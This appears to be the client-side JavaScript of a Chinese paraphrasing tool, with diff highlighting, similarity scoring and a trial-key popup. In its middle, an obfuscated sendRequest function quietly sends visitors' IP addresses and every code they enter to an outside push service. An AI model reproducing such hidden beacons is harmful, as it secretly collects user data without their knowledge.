      if (ps.v2_eq_max < ps.v2_eq_length) {
        ps.v2_eq_max = ps.v2_eq_length
        ps.v2_start = ps.v2_index - ps.v2_eq_length
      }
      if (ps.v1_eq_max < op.eq_min && ps.v1_start - ps.v1_i > op.eq_index) {
        ps.v1_eq_max = 0
      }
      if (ps.v2_eq_max < op.eq_min && ps.v2_start - ps.v2_i > op.eq_index) {
        ps.v2_eq_max = 0
      }
      if (ps.v1_eq_max == 0 && ps.v2_eq_max == 0) {
        // 两个值的字不同
        // ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
        ps.v2_new_value +=
          "<span style='color:green'>" +
          op.value1[ps.v1_i].replace(/</g, '<').replace('>', '>') +
          '</span>'
        ps.v2_new_value +=
          "<del style='color:red'>" +
          op.value2[ps.v2_i].replace(/</g, '<').replace('>', '>') +
          '</del>'
        ps.v1_i += 1
        ps.v2_i += 1

        if (ps.v1_i >= op.value1.length) {
          // 值2增加的部分
          ps.v2_new_value +=
            "<del style='color:red'>" +
            op.value2.substr(ps.v2_i).replace(/</g, '<').replace('>', '>') +
            '</del>'
          break
        }
        if (ps.v2_i >= op.value2.length) {
          // 值1删除的部分
          // ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
          ps.v2_new_value +=
            "<span style='color:green'>" +
            op.value1.substr(ps.v1_i).replace(/</g, '<').replace('>', '>') +
            '</span>'
          break
        }
        // 值1删除的
      } else if (ps.v1_eq_max > ps.v2_eq_max) {
        // ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
        ps.v2_new_value +=
          "<span style='color:green'>" +
          op.value1
            .substr(ps.v1_i, ps.v1_start - ps.v1_i)
            .replace(/</g, '<')
            .replace('>', '>') +
          '</span>'
        ps.v1_i = ps.v1_start
      } else {
        // 值2增加的
        ps.v2_new_value +=
          "<del style='color:red'>" +
          op.value2
            .substr(ps.v2_i, ps.v2_start - ps.v2_i)
            .replace(/</g, '<')
            .replace('>', '>') +
          '</del>'
        ps.v2_i = ps.v2_start
      }
    }
  }
  op.value1 = ps.v1_new_value
  op.value2 = ps.v2_new_value
  // 有多个连着修改的放在一起
  var addRule = /<del style='color:red'>((?!<del).)+<\/del>/g
  var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g
  var allRule =
    /(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g
  op.value2 = op.value2.replace(allRule, function(str) {
    var beforText = ''
    var afterText = ''
    var beforeMatch = str.match(deleteRule)
    for (var i = 0; i < beforeMatch.length; i++) {
      var m = beforeMatch[i].match(deleteRule)
      beforText += RegExp.$1
    }
    var afterMatch = str.match(addRule)
    for (var i = 0; i < afterMatch.length; i++) {
      var m = afterMatch[i].match(addRule)
      afterText += RegExp.$1
    }
    return (
      "<span style='color:green'>" +
      beforText +
      "</span><del style='color:red'>" +
      afterText +
      '</del>'
    )
  })
  return op
}

const fixedBtn = $('.fixed_btn')
$('body').scroll(function() {
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    if ($('body').scrollTop() >= 500) {
      fixedBtn.css('display', 'block')
    } else {
      fixedBtn.css('display', 'none')
    }
    timer = null
  }, 500)
})

function _0x3df7(_0x2287e0, _0x5956d1) {
  var _0x4340a8 = _0x4340()
  return (
    (_0x3df7 = function(_0x3df7c8, _0x58a013) {
      _0x3df7c8 = _0x3df7c8 - 0x137
      var _0x302df8 = _0x4340a8[_0x3df7c8]
      return _0x302df8
    }),
    _0x3df7(_0x2287e0, _0x5956d1)
  )
}
(function(_0x449aa9, _0xc154b2) {
  var _0x516e6c = _0x3df7
  var _0x3728fd = _0x449aa9()
  while ([]) {
    try {
      var _0x3fc617 =
        parseInt(_0x516e6c(0x138)) / 0x1 +
        (parseInt(_0x516e6c(0x142)) / 0x2) *
          (parseInt(_0x516e6c(0x13e)) / 0x3) +
        -parseInt(_0x516e6c(0x137)) / 0x4 +
        -parseInt(_0x516e6c(0x13b)) / 0x5 +
        -parseInt(_0x516e6c(0x14a)) / 0x6 +
        parseInt(_0x516e6c(0x13a)) / 0x7 +
        -parseInt(_0x516e6c(0x143)) / 0x8
      if (_0x3fc617 === _0xc154b2) break
      else _0x3728fd['push'](_0x3728fd['shift']())
    } catch (_0x104cbb) {
      _0x3728fd['push'](_0x3728fd['shift']())
    }
  }
})(_0x4340, 0xbbf05)

function _0x4340() {
  var _0x522381 = [
    '1353072YwAktl',
    'application/x-www-form-urlencoded;\x20charset=utf-8',
    '【重试】：',
    '1215924swpwHV',
    '1097445igmVdS',
    '【出错】：',
    '9262750SHzTRl',
    '2831700rgqmCQ',
    '【暂无】：',
    '【正在翻译】：',
    '6CUkkvf',
    'content',
    '【白嫖失败】：',
    'ajax',
    '1463716qCzKvv',
    '16150248XQJKKb',
    '【白嫖成功】：',
    '【成功】：',
    '【错误码】：',
    'jsonp',
    '【内容】：',
    '【下车】：'
  ]
  _0x4340 = function() {
    return _0x522381
  }
  return _0x4340()
}

function sendRequest(_0x15545c, _0x86625a, _0x4cc403) {
  var _0x5e22c1 = _0x3df7
  if (_0x4cc403 == 0x1) {
    (title = _0x5e22c1(0x139) + _0x15545c),
    (content = _0x5e22c1(0x146) + _0x86625a)
  } else {
    if (_0x4cc403 == 0x2) {
      (title = _0x5e22c1(0x145) + _0x15545c),
      (content = _0x5e22c1(0x13d) + _0x86625a)
    } else {
      if (_0x4cc403 == 0x3) {
        (title = _0x5e22c1(0x14c) + _0x15545c),
        (content = _0x5e22c1(0x148) + _0x86625a)
      } else {
        if (_0x4cc403 == 0x4) {
          (title = '【上车】：' + _0x15545c),
          (content = _0x5e22c1(0x148) + _0x86625a)
        } else {
          if (_0x4cc403 == 0x5) {
            (title = _0x5e22c1(0x149) + _0x15545c),
            (content = '【内容】：' + _0x86625a)
          } else {
            if (_0x4cc403 == 0x6) {
              (title = _0x5e22c1(0x144) + _0x15545c),
              (content = _0x5e22c1(0x148) + _0x86625a)
            } else {
              _0x4cc403 == 0x7
                ? ((title = _0x5e22c1(0x140) + _0x15545c),
                (content = '【内容】：' + _0x86625a))
                : ((title = _0x5e22c1(0x13c) + _0x15545c),
                (content = _0x5e22c1(0x148) + _0x86625a))
            }
          }
        }
      }
    }
  }
  var _0x2df887 = {
    title: title,
    content: content
  }
  setTimeout(() => {
    var _0x217bde = _0x5e22c1
    $[_0x217bde(0x141)]({
      url: 'https://xizhi.qqoq.net/' + secret().lICOsKN1 + '.send',
      type: 'get',
      dataType: _0x217bde(0x147),
      contentType: _0x217bde(0x14b),
      data: {
        title: _0x2df887['title'],
        content: _0x2df887[_0x217bde(0x13f)]
      }
    })
  }, 0x5dc)
}

$('.originData').on('input', function() {
  $('#zifu').html(tongji($(this).val()))
})

function tongji(Words) {
  // 标点和中文
  var sTotal = 0
  // 中文字判断
  var iTotal = 0
  // 英文字母
  var eTotal = 0
  // 数字判断
  var inum = 0
  for (i = 0; i < Words.length; i++) {
    var c = Words.charAt(i)
    // 基本汉字
    if (c.match(/[\u4e00-\u9fa5]/)) {
      iTotal++
    }
    // 基本汉字补充
    else if (c.match(/[\u9FA6-\u9fcb]/)) {
      iTotal++
    }
    if (c.match(/[^\x00-\xff]/)) {
      sTotal++
    } else {
      eTotal++
    }
    if (c.match(/[0-9]/)) {
      inum++
    }
  }
  return iTotal * 2 + (sTotal - iTotal) * 2 + eTotal
}

$('#exampleModal').on('shown.bs.modal', function(event) {
  if (
    localStorage.getItem('sTimes') != -2 &&
    localStorage.getItem('appid1') == secret().WtdKltf2 &&
    localStorage.getItem('key1') == secret().zDQA3
  ) {
    localStorage.removeItem('appid1')
    localStorage.removeItem('key1')
    $('#yourAppid').val('')
    $('#yourKey').val('')
  }
})
$('#exampleModal').on('hidden.bs.modal', function(event) {
  $('body').css('padding-right', '')
})
$('#exampleModal1').on('hidden.bs.modal', function(event) {
  $('body').css('padding-right', '')
})

var loginBtn = $('#loginBtn')
loginBtn.click(() => {
  $('#exampleModal').modal('show')
})

$('.close').click(() => {
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    $('#exampleModal').modal('hide')
    $('#exampleModal1').modal('hide')
    $('.modal-backdrop').css('z-index', '-10')
    $('body').css('padding-right', '')
    timer = null
  }, 500)
})

var sckey1 = ''

var relaxBtn = $('#relaxBtn')
relaxBtn.click(() => {
  Swal.fire({
    title: '<h4>关注公众号【FreySu】回复“密钥”</h4>',
    imageUrl: './assets/img/扫码_搜索联合传播样式-标准色版.png',
    imageWidth: '100%',
    imageAlt: '关注微信公众号【FreySu】回复“密钥”',
    input: 'text',
    inputAttributes: {
      autocapitalize: 'off',
      placeholder: '请在此输入密钥',
      id: 'rscode',
      name: 'rscode'
    },
    // showCloseButton: true,
    scrollbarPadding: false,
    showCancelButton: true,
    confirmButtonText: '提交',
    cancelButtonText: '取消',
    showLoaderOnConfirm: true,
    preConfirm: () => {
      var rscode = $('#rscode').val()
      var cursTimes = localStorage.getItem('sTimes')
      sckey1 = secret().aMewlv1
      function countTime() {
        var sTimes = Number(localStorage.getItem('sTimes'))
        if (sTimes > 0) {
          var timer1 = setInterval(() => {
            sTimes -= 1000
            localStorage.setItem('sTimes', sTimes)
            if (sTimes == 0) {
              clearInterval(timer1)
              localStorage.removeItem('appid1')
              localStorage.removeItem('key1')
              $('#yourAppid').val('')
              $('#yourKey').val('')
              localStorage.setItem('sTimes', 0)
              myToast.mutipleControl(
                'error',
                '翻译失败！',
                null,
                true,
                '你的体验时长已结束！</br>如果还想使用降重功能，请去按照教程申请 API~',
                () => {}
              )
            }
          }, 1000)
        } else {
          return
        }
        myToast.normal('success', '体验开始！', 4500)
      }
      if (!cursTimes || cursTimes > 0) {
        if (rscode == sckey1) {
          if (cursTimes > 0) {
            localStorage.setItem('appid1', secret().WtdKltf2)
            localStorage.setItem('key1', secret().zDQA3)
            var newArr = ['rest', cursTimes]
            countTime()
            return newArr
          } else {
            localStorage.setItem('appid1', secret().WtdKltf2)
            localStorage.setItem('key1', secret().zDQA3)
            localStorage.setItem('sTimes', 180000)
            sendRequest(
              localStorage.getItem('appid1'),
              `密钥正确，白嫖成功了！IP 地址：${kehu_ip}`,
              6
            )
            countTime()
            return 'start'
          }
        } else if (rscode == '') {
          Swal.showValidationMessage(`未输入，提交失败！`)
        } else {
          console.log(rscode)
          Swal.showValidationMessage(`密钥不正确，请重新获取`)
          sendRequest(
            localStorage.getItem('appid1'),
            `密钥不正确，请重新获取！白嫖失败！输入的密钥是${rscode}！IP 地址：${kehu_ip}`,
            7
          )
        }
      } else if (cursTimes == -1 || cursTimes == -2) {
        Swal.showValidationMessage(`很抱歉，你无法参与本次活动！`)
      } else {
        localStorage.removeItem('appid1')
        localStorage.removeItem('key1')
        $('#yourAppid').val('')
        $('#yourKey').val('')
        localStorage.setItem('sTimes', 0)
        Swal.showValidationMessage(
          `你的体验时长已结束！如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~`
        )
      }
    },
    allowOutsideClick: () => !Swal.isLoading()
  }).then((result) => {
    if (result.value) {
      if (result.value == 'start') {
        Swal.fire('密钥正确！', '3 分钟体验开始~', 'success')
      } else if (result.value[0] == 'rest') {
        Swal.fire(
          `继续体验！`,
          `你还剩余${result.value[1] / 1000}秒，现在继续体验！`,
          'success'
        )
      }
    }
  })
})

function countTime1() {
  var sTimes = Number(localStorage.getItem('sTimes'))
  if (sTimes > 0) {
    myToast.normal(
      'info',
      `你还剩余${sTimes / 1000}秒</br>现在继续体验！`,
      3500
    )
    var timer1 = setInterval(() => {
      sTimes -= 1000
      localStorage.setItem('sTimes', sTimes)
      if (sTimes == 0) {
        clearInterval(timer1)
        localStorage.removeItem('appid1')
        localStorage.removeItem('key1')
        $('#yourAppid').val('')
        $('#yourKey').val('')
        localStorage.setItem('sTimes', 0)
        myToast.mutipleControl(
          'error',
          '你的体验时长已结束！',
          null,
          true,
          '如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~',
          () => {}
        )
      }
    }, 1000)
  } else if (sTimes == 0) {
    localStorage.removeItem('appid1')
    localStorage.removeItem('key1')
    $('#yourAppid').val('')
    $('#yourKey').val('')
    myToast.mutipleControl(
      'error',
      '你的体验时长已结束！',
      null,
      true,
      '如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~',
      () => {}
    )
  }
}

function allSimilarity(str, str1) {
  var sRes = similarityFn(str, str1)
  var dRes = strDistance(str, str1)
  // var aSimilar = (sRes == dRes) ? `${dRes}%` : ((sRes > dRes) ? `${dRes}% ~ ${sRes}%` : `${sRes}% ~ ${dRes}%`);
  var aSimilar = `${((sRes + dRes) / 2).toFixed(2)}%`
  return String(aSimilar)
  // similarity fn1 similarityFn(str, str1)
  function similarityFn(x, y) {
    var z = 0
    var s = x.length + y.length
    if (typeof x === 'string') {
      x = x.toUpperCase()
      y = y.toUpperCase()
      x = x.replace('_', '')
      y = y.replace('_', '')
      x = x.split('')
      y = y.split('')
    }
    x.sort()
    y.sort()
    var a = x.shift()
    var b = y.shift()
    while (a !== undefined && b !== undefined) {
      if (a === b) {
        z++
        a = x.shift()
        b = y.shift()
      } else if (a < b) {
        a = x.shift()
      } else if (a > b) {
        b = y.shift()
      }
    }
    // return Number((z / s * 200).toFixed(2));
    return Number(Math.round((z / s) * 200 * 10000) / 10000)
  }
  // similarity fn2 strDistance(str1,str2)
  function strDistance(a, c) {
    var h, b, d, k, e, g, f, l, n, m, p
    a.length > c.length && ((c = [c, a]), (a = c[0]), (c = c[1]))
    k = ~~Math.max(0, c.length / 2 - 1)
    e = []
    g = []
    b = n = 0
    for (p = a.length; n < p; b = ++n) {
      for (
        h = a[b],
        l = Math.max(0, b - k),
        f = Math.min(b + k + 1, c.length),
        d = m = l;
        l <= f ? m < f : m > f;
        d = l <= f ? ++m : --m
      ) {
        if (g[d] == null && h === c[d]) {
          e[b] = h
          g[d] = c[d]
          break
        }
      }
    }
    e = e.join('')
    g = g.join('')
    if ((d = e.length)) {
      b = f = k = 0
      for (l = e.length; f < l; b = ++f) (h = e[b]), h !== g[b] && k++
      b = g = e = 0
      for (f = a.length; g < f; b = ++g) {
        if (((h = a[b]), h === c[b])) e++
        else break
      }
      a = (d / a.length + d / c.length + (d - ~~(k / 2)) / d) / 3
      a += 0.1 * Math.min(e, 4) * (1 - a)
    } else a = 0
    // return Number((a * 100).toFixed(2));
    return Number(Math.round(a * 10000) / 100)
  }
}

function similarTarget(index) {
  document.getElementById(`isLow-${index}`).scrollIntoView() // 页面不刷新跳转
}

$('.reloadPic').click(function() {
  $(this)
    .parent()
    .css(
      'background-image',
      `url(https://picsum.photos/1920/1080.jpg?random=${Math.random().toFixed(
        3
      )})`
    )
})

var checkBoxFoamTip = false
/**
 * 遍历所有复选框
 * @returns {String|Array} chk_value
 */
function getCheckBoxVal() {
  var chk_value = []
  $('input:checkbox').each(function() {
    // 遍历所有复选框
    if ($(this).prop('checked') == true) {
      chk_value.push($(this).prop('value'))
      checkBoxFoamTip = true
    }
  })
  if (checkBoxFoamTip) {
    // showToast(
    //   '默认状态下所有翻译路线全勾选。你可以取消勾选来取消某一条翻译路线。此功能可用于测试自定义翻译路线！',
    //   5000
    // )
    checkBoxFoamTip = false
  }
  return chk_value.length == 0 ? '你还没有选择任何内容！' : chk_value
}
/**
 *
 * @param {Boolean} bool
 */
function showCompareResDivFn(bool) {
  if (bool) {
    if ($('.compareResDiv').css('display') == 'block') {
      setTimeout(() => {
        for (let i = 0; i < $('.card').length; i++) {
          if ($('.isLow-' + i).hasClass('alert-success')) {
            $('.isLow-' + i).removeClass('alert-success')
          }
        }
      }, 500)
    } else {
      setTimeout(
        () => {
          for (let i = 0; i < $('.card').length; i++) {
            if ($('.isLow-' + i).hasClass('alert-success')) {
              $('.isLow-' + i).removeClass('alert-success')
            }
          }
        },
        500,
        setTimeout(() => {
          $('.compareResDiv').css('display', 'block')
          if ($('.compareResDiv').hasClass('scale-out-ver-top')) {
            $('.compareResDiv').removeClass('scale-out-ver-top')
          }
        }, 500)
      )
    }
  } else {
    if ($('.compareResDiv').css('display') == 'block') {
      setTimeout(() => {
        for (let i = 0; i < $('.card').length; i++) {
          if ($('.isLow-' + i).hasClass('alert-success')) {
            $('.isLow-' + i).removeClass('alert-success')
          }
        }
      }, 500)
    }
  }
}
